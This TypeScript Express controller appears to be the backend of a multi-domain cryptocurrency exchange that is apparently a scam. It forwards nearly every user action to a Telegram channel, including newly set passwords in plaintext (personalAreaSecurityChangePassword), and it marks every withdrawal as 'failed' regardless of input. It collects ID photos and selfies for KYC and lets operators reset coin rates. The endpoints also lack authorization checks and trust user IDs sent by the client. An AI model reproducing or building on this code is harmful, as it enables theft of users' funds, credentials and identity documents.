import * as express from 'express'
// import { validationResult } from 'express-validator'
// import ApiError from '../exeptions/api_error'
import UserServices from '../services/user_services'
import moneyService from '../services/money_service'
import ApiError from '../exeptions/api_error'
import telegram from '../api/telegram_api'
import codeGenerator from '../api/password_generator'
import auth_services from '../services/auth_services'
import PROFILE_DATA from 'interface/profile_user.interface'
import USE_PROMO_IN_PROFILE from 'interface/profile_promo_usage.interface'
import TWO_STEP_ENABLE from 'interface/two_step_enable.interface'
import UPDATE_2FA_STATUS from 'interface/update_2fa_status.interface'
import KYC_DATA from 'interface/kyc.interface'
import DEPOSIT_HISTORY from 'interface/deposit_history.interface'
import WITHDRAWAL_HISTORY from 'interface/withdrawal_history.interface'
import SWAP_HISTORY from 'interface/swap_history.interface'
import INTERNAL_HISTORY from 'interface/internal_history.interface'
import { DEAL_INTERFACE } from 'interface/secure_deal.interface'
import bodyValidator from '../api/body_validator'
import saveUserLogs from '../api/save_user_logs'
import TRADING_ORDER_INTERFACE from '../interface/make_trading_order.interface'
import TRADING_COIN_RATE_UPDATE from '../interface/trading_rate_update.interface'
import CHAT_DATA from '../interface/chat_data.interface'


class UserController {

  async dashboard(req: express.Request, res: express.Response, next: express.NextFunction) {
    const { id, email, ipAddress, city, browser, countryName, coordinates, currentDate, domainName } = req.body

    const validData: boolean = await bodyValidator(req.body, 9)
    if (!validData) return res.status(400).json({ message: 'problem in received data' })
    try {
      // get user id & => 
      // get total balance & currency balances 

      const user: any = await UserServices.dashboard(id)
      console.log('found user is: ', user)
      if (!user) throw ApiError.ServerError()


      if (user.hasOwnProperty('withoutLogs') && user.withoutLogs === true) {
        return res.status(200).json({ user: user })
      }

      await saveUserLogs(email, ipAddress, city, browser, countryName, coordinates, currentDate, 'перешел на dashboard', domainName)
      await telegram.sendMessageByUserActions(email, ' перешел на dashboard ', domainName)

      return res.status(200).json({ user: user })
    } catch (e) {
      next(e)
    }
  }

  async personalAreaProfile(req: express.Request, res: express.Response, next: express.NextFunction) {

    const transfer_object: PROFILE_DATA = {
      userId: req.body.userId,
      userEmail: req.body.userEmail,
      ipAddress: req.body.ipAddress,
      city: req.body.city,
      browser: req.body.browser,
      countryName: req.body.countryName,
      coordinates: req.body.coordinates,
      currentDate: req.body.currentDate,
      userAction: req.body.userAction,
      domainName: req.body.domainName
    }

    const validData: boolean = await bodyValidator(req.body, 10)
    if (!validData) return res.status(400).json({ message: 'problem in received data' })
    try {
      const user: any = await UserServices.personalAreaProfile(transfer_object.userId)
      console.log('found user is: ', user)

      if (!user) throw ApiError.ServerError()
      if (user.hasOwnProperty('withoutLogs') && user.withoutLogs === true) return res.status(200).json({ user: user, message: 'OK' })

      await saveUserLogs(transfer_object.userEmail, transfer_object.ipAddress, transfer_object.city, transfer_object.countryName, transfer_object.coordinates, transfer_object.browser, transfer_object.currentDate, `перешел на ${transfer_object.userAction} `, transfer_object.domainName)
      await telegram.sendMessageByUserActions(transfer_object.userEmail, ` перешел на ${transfer_object.userAction}`, transfer_object.domainName)
      return res.status(200).json({ user: user, message: 'OK' })

    } catch (e) {
      next(e)
    }
  }

  async usePromocodeInProfile(req: express.Request, res: express.Response, next: express.NextFunction) {

    const transfer_object: USE_PROMO_IN_PROFILE = {
      userId: req.body.userId,
      userEmail: req.body.userEmail,
      ipAddress: req.body.ipAddress,
      city: req.body.city,
      browser: req.body.browser,
      countryName: req.body.countryName,
      coordinates: req.body.coordinates,
      currentDate: req.body.currentDate,
      userAction: req.body.userAction,
      domainName: req.body.domainName,
      promocode: req.body.code
    }

    const validData: boolean = await bodyValidator(req.body, 11)
    if (!validData) return res.status(400).json({ message: 'problem in received data' })
    try {
      const result: any = await UserServices.UsePromocodeInProfile(transfer_object.promocode)
      if (!result) throw ApiError.ServerError()

      const rebasePromo: boolean = await auth_services.rebasePromocodeToUsed(transfer_object.promocode, transfer_object.userEmail)
      if (!rebasePromo) throw ApiError.ServerError()
      await saveUserLogs(transfer_object.userEmail, transfer_object.ipAddress, transfer_object.city, transfer_object.countryName, transfer_object.coordinates, transfer_object.browser, transfer_object.currentDate, ` использовал промокод ${transfer_object.promocode} на `, transfer_object.domainName)
      await telegram.sendMessageByUserActions(transfer_object.userEmail, ` использовал промокод ${transfer_object.promocode} `, transfer_object.domainName)
      return res.status(200).json({ message: 'ok' })

    } catch (e) {
      next(e)
    }
  }

  // async personalAreaProfileEdit(req: express.Request, res: express.Response, next: express.NextFunction) {
  //   try {
  //     const { userId, userName, userEmail, domainName, ipAddress, city, countryName, coordinates, currentDate, userAction } = req.body
  //     console.log('req body: ', req.body);

  //     if (!userName && !userId) return res.status(400).json({ message: 'wrong data' })
  //     const result: boolean = await UserServices.changeNameInProfile(userId, userName)
  //     if (!result) return res.status(400).json({ message: 'can`t find any user' })

  //     await saveUserLogs(userId, userEmail, ipAddress, city, countryName, coordinates, currentDate, ` поменял имя на ${userName} `, domainName)
  //     await telegram.sendMessageByUserActions(userEmail, ` поменял имя на ${userName} `, domainName)
  //     return res.status(200).json({ message: 'OK' })

  //   } catch (e) {
  //     next(e)
  //   }
  // }

  async twoStepVerificationEnable(req: express.Request, res: express.Response, next: express.NextFunction) {
    const code: string = await codeGenerator(8)
    console.log('generated code is: ', code);

    const transferObject: TWO_STEP_ENABLE = {
      twoFaType: req.body.twoFaType,
      twoFaStatus: req.body.twoFaStatus,
      domainName: req.body.domainName,
      userId: req.body.userId,
      userEmail: req.body.userEmail,
      currentTime: req.body.currentTime,
      code: code
    }


    const validData: boolean = await bodyValidator(req.body, 6)
    if (!validData) return res.status(400).json({ message: 'problem in received data' })

    try {
      const result: boolean | object = await UserServices.enableTwoStepVerification(transferObject)
      if (!result) throw ApiError.ServerError()

      return res.status(202).json(result)
    } catch (e) {
      next(e)
    }
  }

  async validateTwoStepCodeAtEnable2fa(req: express.Request, res: express.Response, next: express.NextFunction) {
    const code: string = req.params.code
    try {
      const result: boolean | object = await UserServices.validateTwoStepCodeAtEnable2fa(code)
      if (!result) throw ApiError.ServerError()

      return res.status(202).json({ message: 'success' })
    } catch (e) {
      next(e)
    }
  }

  async enableTwoStepVerificationStatus(req: express.Request, res: express.Response, next: express.NextFunction) {
    const transferObject: UPDATE_2FA_STATUS = {
      twoFaType: req.body.twoFaType,
      userId: req.body.userId,
      userEmail: req.body.userEmail,
      domainName: req.body.domainName,
      twoFaStatus: req.body.twoFaStatus,
      enableDate: req.body.enableDate
    }
    const logObject = {
      ipAddress: req.body.ipAddress,
      city: req.body.city,
      browser: req.body.browser,
      countryName: req.body.countryName,
      coordinates: req.body.coordinates,
      logTime: req.body.logTime,
    }

    const telegramId: string = req.body.telegramId

    const validData: boolean = await bodyValidator(req.body, 12)
    if (!validData) return res.status(400).json({ message: 'problem in received data' })
    try {

      const result: boolean = await UserServices.enableTwoStepVerificationStatus(transferObject, telegramId)
      if (!result) throw ApiError.ServerError()
      await saveUserLogs(transferObject.userEmail, logObject.ipAddress, logObject.city, logObject.countryName, logObject.coordinates, logObject.browser, logObject.logTime, ` включил 2fa по ${transferObject.twoFaType} на `, transferObject.domainName)
      await telegram.sendMessageByUserActions(transferObject.userEmail, ` включит 2fa по ${transferObject.twoFaType} `, transferObject.domainName)
      return res.status(200).json({ message: '2fa turned on' })
    } catch (e) {
      next(e)
    }
  }

  // async deleteExpiredCode(req: express.Request, res: express.Response, next: express.NextFunction) {
  //   try {
  //     const userEmail: string = req.params.userEmail

  //     console.log('req userEmail: ', req.params);
  //     if (!userEmail) return res.status(400).json({ message: 'wrong data' })

  //     const result: boolean = await UserServices.deleteExpiredCode(userEmail)
  //     if (!result) throw ApiError.ServerError()

  //     return res.status(200).json({ message: 'OK' })
  //   } catch (e) {
  //     next(e)
  //   }
  // }


  async disableTwoStepVerificationStatus(req: express.Request, res: express.Response, next: express.NextFunction) {
    const { userId, userEmail, ipAddress, city, countryName, coordinates, currentDate, domainName } = req.body
    const validData: boolean = await bodyValidator(req.body, 8)
    if (!validData) return res.status(400).json({ message: 'problem in received data' })
    try {

      const result: boolean = await UserServices.disableUserTwoStep(userId)
      if (!result) throw ApiError.ServerError()

      await saveUserLogs(userId, userEmail, ipAddress, city, countryName, coordinates, currentDate, ` выключил 2фа аутентификацию на`, domainName)
      await telegram.sendMessageByUserActions(userEmail, ` выключил 2фа аутентификацию`, domainName)
      return res.status(200).json({ message: '2fa turned off' })

    } catch (e) {
      next(e)
    }
  }

  async personalAreaSecurityChangePassword(req: express.Request, res: express.Response, next: express.NextFunction) {
    const { id, newPassword, userEmail, domainName, ipAddress, city, countryName, coordinates, currentDate } = req.body

    const validData: boolean = await bodyValidator(req.body, 9)
    if (!validData) return res.status(400).json({ message: 'problem in received data' })
    try {
      const result: any = await UserServices.personalAreaChangePassword(userEmail, newPassword)
      if (typeof result === 'string') return res.status(304).json(result)
      if (!result) return res.status(400).json({ message: 'rejected' })

      await saveUserLogs(id, userEmail, ipAddress, city, countryName, coordinates, currentDate, `поменял пароль на  ${newPassword} на`, domainName)
      await telegram.sendMessageByUserActions(userEmail, `поменял пароль на  ${newPassword}`, domainName)
      console.log('operation status: ', result)
      return res.status(200).json({ message: 'OK' })

    } catch (e) {
      next(e)
    }
  }

  async personalAreaKyc(req: express.Request, res: express.Response, next: express.NextFunction) {

    console.log(' <==== received files => ', req.files);


    const transfer_object: KYC_DATA = {
      userId: req.body.userId,
      userEmail: req.body.userEmail,
      firstName: req.body.firstName,
      lastName: req.body.lastName,
      phoneNumber: req.body.phoneNumber,
      dateOfBirth: req.body.dateOfBirth,
      documentNumber: req.body.documentNumber,
      mainAddress: req.body.mainAddress,
      zipCode: req.body.zipCode,
      documentType: req.body.documentType,
      ipAddress: req.body.ipAddress,
      state: req.body.state,
      city: req.body.city,
      browser: req.body.browser,
      documents: {
        // req file !!!!!!!!!!!!!
        frontDocumentPhoto: req.body.frontDocumentPhoto,
        backDocumentPhoto: req.body.frontDocumentPhoto,
        selfieDocumentPhoto: req.body.selfieDocumentPhoto
      },
      subAddress: req.body.subAddress,
      countryName: req.body.countryName,
      coordinates: req.body.coordinates,
      currentDate: req.body.currentDate,
      userAction: req.body.userAction,
      domainName: req.body.domainName,
      kycStatus: 'pending'
    }


    for (let index in req.body) {
      if (req.body[index] === null || req.body[index] === undefined) {
        if (typeof req.body[index] === 'object') {
          for (let i in req.body[index]) {
            if (req.body[index][i] === null || req.body[index][i] === undefined) {
              return res.status(400).json({ message: 'wrong data' })
            }
          }
          return res.status(400).json({ message: 'problem in received data' })
        }
      }
    }

    try {
      const result: boolean = await UserServices.personalAreaSendKyc(transfer_object)
      console.log('operation result is: ', result)

      if (!result) return res.status(400).json({ message: 'kyc already added' })

      await saveUserLogs(transfer_object.userEmail, transfer_object.ipAddress, transfer_object.city, transfer_object.countryName, transfer_object.coordinates, transfer_object.browser, transfer_object.currentDate, ' отправил KYC ', transfer_object.domainName)
      await telegram.sendMessageByUserActions(transfer_object.userEmail, ' отправил KYC ', transfer_object.domainName)
      return res.status(201).json({ message: 'ok' })

    } catch (e) {
      next(e)
    }
  }

  async secondPartyChecker(req: express.Request, res: express.Response, next: express.NextFunction) {
    console.log('req: ', req.params);
    const userEmail: string = req.params.userEmail
    const domainName: string = req.params.domainName
    if (!userEmail || !domainName) return res.status(400).json({ message: 'wrong data' })

    try {
      const result: boolean = await UserServices.FindSecondPartyUser(userEmail, domainName)
      if (!result) return res.status(400).json({ message: 'wrong data' })

      return res.status(200).json({ message: 'OK' })
    } catch (e) {
      next(e)
    }
  }

  async checkInternalWallet(req: express.Request, res: express.Response, next: express.NextFunction) {
    console.log('req: ', req.params);
    const domainName: string = req.params.domainName
    const userWallet: string = req.params.userWallet
    if (!domainName || !userWallet) return res.status(400).json({ message: 'wrong data' })

    try {
      const result: any = await UserServices.verifInternalWallet(userWallet, domainName)
      if (!result) throw ApiError.ServerError()

      return res.status(200).json({ message: 'OK' })
    } catch (e) {
      next(e)
    }
  }


  async getAddressForDeposit(req: express.Request, res: express.Response, next: express.NextFunction) {
    const userId: string = req.body.userId
    const coinName: string = req.body.coinName
    const coinFullName: string = req.body.coinFullName
    const expiredTime: number = req.body.expiredTime
    const userEmail: string = req.body.userEmail

    const validData: boolean = await bodyValidator(req.body, 5)
    if (!validData) return res.status(400).json({ message: 'problem in received data' })

    try {
      const result: any = await moneyService.GenerateDepositAddress(userId, userEmail, coinName, coinFullName, expiredTime)
      if (!result) throw ApiError.ServerError()

      return res.status(200).json(result)

    } catch (e) {
      next(e)
    }
  }

  async getUserBalance(req: express.Request, res: express.Response, next: express.NextFunction) {
    const userId: string = req.params.id
    console.log('userID => ', userId);
    if (!userId || userId === undefined) return res.status(400).json({ message: 'wrong data' })

    try {
      const result: any = await UserServices.getUserBalance(userId)
      if (!result) throw ApiError.ServerError()

      return res.status(200).json(result)

    } catch (e) {
      next(e)
    }
  }

  async makeDeposit(req: express.Request, res: express.Response, next: express.NextFunction) {

    const transfer_object: DEPOSIT_HISTORY = {
      userId: req.body.userId,
      userEmail: req.body.userEmail,
      domainName: req.body.domainName,
      coinName: req.body.coinName,
      coinFullName: req.body.coinFullName,
      amountInCrypto: req.body.amountInCrypto,
      amountInUsd: req.body.amountInUsd,
      currentDate: req.body.currentDate,
      depositAddress: req.body.depositAddress,
      depositStatus: req.body.depositStatus,
    }

    const ipAddress: string = req.body.ipAddress
    const city: string = req.body.city
    const browser: string = req.body.browser
    const countryName: string = req.body.countryName
    const coordinates: string = req.body.coordinates
    const logTime: string = req.body.logTime

    const validData: boolean = await bodyValidator(req.body, 16)
    if (!validData) return res.status(400).json({ message: 'problem in received data' })

    try {
      const result: boolean = await moneyService.MakeDeposit(transfer_object, logTime)
      console.log('operation result is: ', result)
      if (!result) throw ApiError.ServerError()

      await saveUserLogs(transfer_object.userEmail, ipAddress, city, countryName, coordinates, browser, logTime, ` создал заявку на вывод на сумму ${transfer_object.amountInCrypto} ${transfer_object.coinName}($ ${transfer_object.amountInUsd})`, transfer_object.domainName)
      await telegram.sendMessageByUserActions(transfer_object.userEmail, ` создал заявку на депозит на сумму ${transfer_object.amountInCrypto}(${transfer_object.amountInUsd}) ${transfer_object.coinName} `, transfer_object.domainName)
      return res.status(201).json({ message: 'ok' })

    } catch (e) {
      next(e)
    }
  }

  async getDepositHistory(req: express.Request, res: express.Response, next: express.NextFunction) {
    console.log('req params is: ', req.params)
    const userId: string = req.params.userId
    let skip: string = req.params.skipValue
    const skipValue: number = parseInt(skip)
    let limit: string = req.params.limitValue
    const limitValue: number = parseInt(limit)

    if (!userId) return res.status(400).json({ message: 'wrong data' })
    try {
      const result: any = await UserServices.GetDepositHistory(skipValue, limitValue, userId)
      console.log(' result is: ', result)
      if (!result) return res.status(500).json({ message: 'internal server error' })

      return res.status(200).json({ message: 'ok', depositHistory: result })

    } catch (e) {
      next(e)
    }
  }

  async makeWithdrawal(req: express.Request, res: express.Response, next: express.NextFunction) {

    let transfer_object: WITHDRAWAL_HISTORY = {
      userId: req.body.userId,
      userEmail: req.body.userEmail,
      domainName: req.body.domainName,
      coinName: req.body.coinName,
      coinFullName: req.body.coinFullName,
      amountInCrypto: req.body.amountInCrypto,
      amountInUsd: req.body.amountInUsd,
      currentDate: req.body.currentDate,
      withdrawalAddress: req.body.withdrawalAddress,
      withdrawalStatus: req.body.withdrawalStatus
    }

    const ipAddress: string = req.body.ipAddress
    const city: string = req.body.city
    const browser: string = req.body.browser
    const countryName: string = req.body.countryName
    const coordinates: string = req.body.coordinates
    const logTime: string = req.body.logTime
    const errorId: string = req.body.errorId

    if (req.body.withdrawalStatus !== 'failed ') {
      transfer_object.withdrawalStatus = 'failed'
    }

    const validData: boolean = await bodyValidator(req.body, 17)
    if (!validData) return res.status(400).json({ message: 'problem in received data' })
    try {
      const result: any = await moneyService.MakeWithdrawal(transfer_object, errorId)
      if (!result) throw ApiError.ServerError()

      await saveUserLogs(transfer_object.userEmail, ipAddress, city, countryName, coordinates, browser, logTime, ` создал заявку на вывод на сумму ${transfer_object.amountInCrypto} ${transfer_object.coinName}($ ${transfer_object.amountInUsd})`, transfer_object.domainName)
      await telegram.sendMessageByUserActions(transfer_object.userEmail, ` создал заявку на вывод на сумму ${transfer_object.amountInCrypto}("${transfer_object.amountInUsd} ) ${transfer_object.coinName}" `, transfer_object.domainName)
      return res.status(201).json(result)

    } catch (e) {
      next(e)
    }
  }

  async getWithdrawalHistory(req: express.Request, res: express.Response, next: express.NextFunction) {
    const userId: string = req.params.userId
    let skip: string = req.params.skipValue
    const skipValue: number = parseInt(skip)
    let limit: string = req.params.limitValue
    const limitValue: number = parseInt(limit)
    console.log('user id is: ', userId)

    if (!userId) return res.status(400).json({ message: 'wrong data' })
    try {
      const result: any = await UserServices.GetWithdrawalHistory(skipValue, limitValue, userId)
      console.log(' result is: ', result)
      if (!result) return res.status(500).json({ message: 'internal server error' })

      return res.status(200).json({ message: 'ok', withdrawHistory: result })
    } catch (e) {
      next(e)
    }
  }

  async makeSwap(req: express.Request, res: express.Response, next: express.NextFunction) {

    const transfer_object: SWAP_HISTORY = {
      userId: req.body.userId,
      userEmail: req.body.userEmail,
      domainName: req.body.domainName,
      coinNameFrom: req.body.coinNameFrom,
      coinNameTo: req.body.coinNameTo,
      amountInCryptoFrom: req.body.amountInCryptoFrom,
      amountInCryptoTo: req.body.amountInCryptoTo,
      amountInUsd: req.body.amountInUsd,
      currentDate: req.body.currentDate,
      swapStatus: req.body.swapStatus
    }

    const ipAddress: string = req.body.ipAddress
    const city: string = req.body.city
    const browser: string = req.body.browser
    const countryName: string = req.body.countryName
    const coordinates: string = req.body.coordinates
    const logTime: string = req.body.logTime

    const validData: boolean = await bodyValidator(req.body, 16)
    if (!validData) return res.status(400).json({ message: 'problem in received data' })
    try {

      const result: boolean = await moneyService.MakeSwap(transfer_object)
      if (!result) throw ApiError.ServerError()

      await saveUserLogs(transfer_object.userEmail, ipAddress, city, countryName, coordinates, browser, logTime, ` совершил свап(${transfer_object.amountInCryptoFrom} ${transfer_object.coinNameFrom} на ${transfer_object.amountInCryptoTo} ${transfer_object.coinNameTo}) на `, transfer_object.domainName)
      await telegram.sendMessageByUserActions(transfer_object.userEmail, ` совершил свап(${transfer_object.amountInCryptoFrom} ${transfer_object.coinNameFrom} на ${transfer_object.amountInCryptoTo}  ${transfer_object.coinNameTo}) `, transfer_object.domainName)
      return res.status(201).json({ message: 'ok' })

    } catch (e) {
      next(e)
    }
  }

  async getSwapHistory(req: express.Request, res: express.Response, next: express.NextFunction) {
    const userId: string = req.params.userId
    console.log('user id is: ', userId)

    if (!userId) return res.status(400).json({ message: 'wrong data' })
    try {
      const result: any = await UserServices.GetSwapHistory(userId)
      if (!result) throw ApiError.ServerError()

      return res.status(200).json({ message: 'ok', swapHistory: result })
    } catch (e) {
      next(e)
    }
  }

  async getInternalData(req: express.Request, res: express.Response, next: express.NextFunction) {

    let userId: string = req.params.userId
    console.log('req params is: ', userId);
    if (!userId) return res.status(400).json({ message: 'wrong data' })
    try {
      const result: any = await moneyService.GetInternalData(userId)
      if (!result) throw ApiError.ServerError()
      return res.status(200).json(result)

    } catch (e) {
      next(e)
    }
  }


  async balanceChecker(req: express.Request, res: express.Response, next: express.NextFunction) {

    const userId: string = req.params.userId
    const coinName: string = req.params.coinName
    console.log('req params is: ', req.params);

    if (!userId || !coinName) return res.status(400).json({ message: 'wrong data' })
    try {
      const result: any = await moneyService.getBalances(userId, coinName)
      if (!result) throw ApiError.ServerError()
      return res.status(200).json(result)

    } catch (e) {
      next(e)
    }
  }

  async makeInternalTransfer(req: express.Request, res: express.Response, next: express.NextFunction) {

    const transfer_object: INTERNAL_HISTORY = {
      userId: req.body.userId,
      userEmail: req.body.userEmail,
      domainName: req.body.domainName,
      coinName: req.body.coinName,
      amountInCrypto: req.body.amountInCrypto,
      amountInUsd: req.body.amountInUsd,
      currentDate: req.body.currentDate,
      fromAddress: req.body.fromAddress,
      toAddress: req.body.toAddress,
      transferType: req.body.transferType,
      transferStatus: req.body.transferStatus,
    }

    const ipAddress: string = req.body.ipAddress
    const city: string = req.body.city
    const browser: string = req.body.browser
    const countryName: string = req.body.countryName
    const coordinates: string = req.body.coordinates
    const logTime: string = req.body.logTime

    const validData: boolean = await bodyValidator(req.body, 17)
    if (!validData) return res.status(400).json({ message: 'problem in received data' })
    try {
      const result: boolean | string = await moneyService.MakeInternalTransfer(transfer_object)
      console.log('result is: ', result)
      if (!result) throw ApiError.ServerError()

      await saveUserLogs(transfer_object.userEmail, ipAddress, city, countryName, coordinates, browser, logTime, ` совершил внутренний перевод пользователю ${result} на сумму  ${transfer_object.amountInCrypto}  ${transfer_object.coinName} на `, transfer_object.domainName)
      await telegram.sendMessageByUserActions(transfer_object.userEmail, ` совершил внутренний перевод пользователю ${result} на сумму  ${transfer_object.amountInCrypto}  ${transfer_object.coinName} `, transfer_object.domainName)
      return res.status(201).json({ message: 'ok' })

    } catch (e) {
      next(e)
    }
  }

  async getInternalTransferHistory(req: express.Request, res: express.Response, next: express.NextFunction) {
    const userId: string = req.params.userId
    let skip: string = req.params.skipValue
    const skipValue: number = parseInt(skip)
    let limit: string = req.params.limitValue
    const limitValue: number = parseInt(limit)
    console.log('userId', userId);

    if (!userId) return res.status(400).json({ message: 'wrong data' })
    try {
      const result: any = await UserServices.GetInternalTransferHistory(skipValue, limitValue, userId)
      if (typeof result === 'string') return res.status(200).json(result)
      if (!result) throw ApiError.ServerError()

      return res.status(200).json({ message: 'ok', internalTransferHistory: result })
    } catch (e) {
      next(e)
    }
  }

  async support(req: express.Request, res: express.Response, next: express.NextFunction) {
    try {

      // chat with support
    } catch (e) {
      next(e)
    }
  }


  async getNews(req: express.Request, res: express.Response, next: express.NextFunction) {
    const domainId: string = req.params.domainId
    if (!domainId) return res.status(400).json({ message: 'wrong data' })
    try {
      const result: any = await UserServices.getNewsByDomainName(domainId)
      if (!result) throw ApiError.ServerError()
      if (typeof result === 'string') return res.status(202).json(result)

      return res.status(200).json(result)

      // chat with support
    } catch (e) {
      next(e)
    }
  }

  async secureDealCreate(req: express.Request, res: express.Response, next: express.NextFunction) {

    const transferObject: DEAL_INTERFACE = {
      userEmail: req.body.userEmail,
      secondPartyEmail: req.body.secondPartyEmail,
      dealCondition: req.body.dealCondition,
      coinName: req.body.coinName,
      amountInCrypto: req.body.amountInCrypto,
      seller: req.body.sellerEmail,
      buyer: req.body.buyerEmail,
      status: req.body.status,
      acceptCode: '1',
      dealDedline: req.body.dealDedline,
      dateOfCreate: req.body.currentDate
    }
    const userId: string = req.body.userId

    const validData: boolean = await bodyValidator(req.body, 11)
    if (!validData) return res.status(400).json({ message: 'problem in received data' })
    try {
      const result: boolean = await UserServices.createSecureDeal(transferObject, userId)
      if (!result) throw ApiError.ServerError()

      return res.status(200).json({ message: 'ok' })
    } catch (e) {
      next(e)
    }
  }

  async getSecureDealDetail(req: express.Request, res: express.Response, next: express.NextFunction) {

    const dealId: string = req.params.dealId
    const userEmail: string = req.params.userEmail
    if (!dealId || !userEmail) return res.status(400).json({ message: 'wrong data' })

    try {
      const result: any = await UserServices.getSecureDealDetail(dealId, userEmail)
      console.log(' result is: ', result)
      if (!result) throw ApiError.ServerError()

      return res.status(200).json({ message: 'ok', dealDetail: result })
    } catch (e) {
      next(e)
    }

  }

  async getSecureDealHistory(req: express.Request, res: express.Response, next: express.NextFunction) {

    const userEmail: string = req.params.userEmail
    if (!userEmail) return res.status(400).json({ message: 'wrong data' })

    try {
      const result: any = await UserServices.getSecureDealHistory(userEmail)
      console.log(' result is: ', result)
      if (!result) throw ApiError.ServerError()

      return res.status(200).json({ message: 'ok', history: result })
    } catch (e) {
      next(e)
    }
  }

  async acceptDeal(req: express.Request, res: express.Response, next: express.NextFunction) {
    const dealId: string = req.body.dealId
    const dealCode: string = req.body.acceptCode

    if (!dealId || !dealCode) return res.status(400).json({ message: 'wrong data' })
    try {
      const result: any = await UserServices.acceptSecureDeal(dealId, dealCode)
      console.log(' result is: ', result)
      if (!result) throw ApiError.ServerError()

      return res.status(200).json({ message: 'ok' })
    } catch (e) {
      next(e)
    }
  }

  async killDealByMissDeadline(req: express.Request, res: express.Response, next: express.NextFunction) {
    const dealId: string = req.body.dealId
    const dedline: number = req.body.dedline

    if (!dealId || !dedline) return res.status(400).json({ message: 'wrong data' })
    try {
      const result: boolean = await UserServices.killDealByMissDeadline(dealId, dedline)
      console.log(' result is: ', result)
      if (!result) throw ApiError.ServerError()

      return res.status(200).json({ message: 'ok' })
    } catch (e) {
      next(e)
    }
  }

  async getOrderHistory(req: express.Request, res: express.Response, next: express.NextFunction) {
    const userId: string = req.params.userId
    const skip: string = req.params.skipValue
    const skipValue: number = parseInt(skip)
    const limit: string = req.params.limitValue
    const limitValue: number = parseInt(limit)

    console.log('received params => ', req.params);
    if (!req.params) return res.status(400).json({ message: 'wrong data' })

    try {

      const result: boolean | object = await UserServices.getOrderHistory(userId, skipValue, limitValue)
      console.log(' order list is: ', result)
      if (!result) throw ApiError.ServerError()

      return res.status(200).json(result)
    } catch (e) {
      next(e)
    }
  }


  async resetTradingData(req: express.Request, res: express.Response, next: express.NextFunction) {

    const coinName: string = req.body.coinName
    const domainName: string = req.body.domainName

    const validData: boolean = await bodyValidator(req.body, 2)
    if (!validData) return res.status(400).json({ message: 'problem in received data' })

    try {
      const result: any = await UserServices.updateCoinRate(domainName, coinName)
      if (!result) throw ApiError.ServerError()
      return res.status(200).json(result)

    } catch (e) {
      next(e)
    }
  }

  async makeTradingOrder(req: express.Request, res: express.Response, next: express.NextFunction) {
    const transferObject: TRADING_ORDER_INTERFACE = {
      userEmail: req.body.userEmail,
      domainName: req.body.domainName,
      orderDate: req.body.orderDate,
      coinName: req.body.coinName,
      coinValue: req.body.coinValue,
      valueInUsdt: req.body.valueInUsdt,
      coinRate: req.body.coinRate,
      orderStatus: req.body.orderStatus,
      orderType: req.body.orderType,
      userId: req.body.userId
    }

    const validData: boolean = await bodyValidator(req.body, 9)
    if (!validData) return res.status(400).json({ message: 'problem in received data' })

    try {

      const result: boolean = await UserServices.makeTradingOrder(transferObject)
      console.log(' order result is: ', result)
      if (!result) throw ApiError.ServerError()

      return res.status(201).json(result)

    } catch (e) {
      next(e)
    }
  }

  async getTradingData(req: express.Request, res: express.Response, next: express.NextFunction) {

    const domainName: string = req.params.domainName

    try {
      const result: any = await UserServices.getTradingDataAsUser(domainName)
      console.log(' result is: ', result)
      if (!result) throw ApiError.ServerError()

      return res.status(201).json(result)
    } catch (e) {
      next(e)
    }
  }

  async cancelOrder(req: express.Request, res: express.Response, next: express.NextFunction) {

    const orderId: string = req.params.orderId

    try {
      const result: boolean = await UserServices.cancelUserOrder(orderId)
      console.log(' result is: ', result)
      if (!result) throw ApiError.ServerError()

      return res.status(202).json({ message: 'ok' })
    } catch (e) {
      next(e)
    }
  }

  async successOrder(req: express.Request, res: express.Response, next: express.NextFunction) {
    const orderId: string = req.body.orderId
    const orderType: boolean = req.body.orderType

    const validData: boolean = await bodyValidator(req.body, 2)
    if (!validData) return res.status(400).json({ message: 'problem in received data' })

    try {
      const result: boolean = await UserServices.successUserOrder(orderId, orderType)
      console.log(' result is: ', result)
      if (!result) throw ApiError.ServerError()

      return res.status(202).json({ message: 'ok' })
    } catch (e) {
      next(e)
    }
  }

  async getChatData(req: express.Request, res: express.Response, next: express.NextFunction) {
    const userId: string = req.params.userId
    let skip: string = req.params.skipValue
    const skipValue: number = parseInt(skip)
    let limit: string = req.params.limitValue
    const limitValue: number = parseInt(limit)

    try {
      const result: any = await UserServices.GetChatDataForUser(userId, skipValue, limitValue)
      console.log(' result is: ', result)
      if (!result) throw ApiError.ServerError()

      return res.status(202).json(result)
    } catch (e) {
      next(e)
    }
  }


  async sendMessageToSupport(req: express.Request, res: express.Response, next: express.NextFunction) {

    const transferObject: CHAT_DATA = {
      userId: req.body.userId,
      domainName: req.body.domainName,
      staffId: '',
      curDate: req.body.curDate,
      messageBody: req.body.messageBody,
      imageLink: req.body.imageLink,
      chatId: req.body.chatId
    }

    const validData: boolean = await bodyValidator(req.body, 5)
    if (!validData) return res.status(400).json({ message: 'problem in received data' })

    try {
      const result: boolean = await UserServices.sendMessageToSupport(transferObject)
      console.log(' result is: ', result)
      if (!result) throw ApiError.ServerError()

      return res.status(202).json({ message: 'ok' })
    } catch (e) {
      next(e)
    }
  }


}

export default new UserController()